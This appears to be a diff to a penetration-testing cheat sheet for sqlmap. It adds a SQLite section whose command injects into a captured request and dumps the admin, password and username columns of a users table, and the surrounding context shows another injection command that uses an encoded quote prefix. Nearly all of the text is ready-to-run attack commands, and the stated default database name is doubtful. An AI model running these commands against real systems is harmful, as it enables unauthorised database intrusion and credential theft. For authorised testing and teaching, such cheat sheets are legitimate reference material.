@@ -6,6 +6,12 @@ Use Prefix and Suffix for more challenging attacks
 sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
 ```
 
+SQLite sample 
+-------------
+```
+# NOTE: Notice the -D paramater is "SQLite_masterdb", this appears to be the default database for SQLite. 
+sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump
+```
 
 SQLMap Tamper Data
 -------------
